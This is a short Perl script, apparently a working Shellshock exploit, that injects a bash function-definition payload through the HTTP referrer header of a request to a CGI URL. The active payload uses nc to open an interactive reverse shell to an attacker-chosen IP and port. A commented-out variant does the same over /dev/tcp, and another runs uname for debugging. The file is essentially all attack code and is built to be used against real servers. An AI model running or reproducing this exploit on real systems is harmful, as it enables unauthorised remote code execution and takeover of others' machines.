#!/usr/bin/perl
# not using strict and warnings is for plebs.
use strict;
use warnings;
use LWP::UserAgent;

sub shock {
  my ($url, $revip, $revport) = @_; 
  my $ua = LWP::UserAgent->new;
  my $req = HTTP::Request->new(GET => $url);
#  my $revshell = "() { :; }; /bin/bash -c 'python -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\" <> /dev/tcp/".$revip."/".$revport." >&0 2>&0'"; # works on some boxes...
  my $revshell = "() { :; }; /bin/nc -c '/usr/local/bin/python -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\"' ".$revip." ".$revport;
#  print $revshell;
#  my $revshell = "() { :; }; echo;/bin/uname -a"; # debugging
  $req->header('referrer' => $revshell);
  my $resp = $ua->request($req);
  print $resp->decoded_content;
  # do some shit
}

if ($#ARGV + 1 != 3){
  print "use: ./shellshock.pl http://something.com/something.cgi 1.3.3.7 1337\n";
  exit;
}
shock($ARGV[0], $ARGV[1], $ARGV[2]);
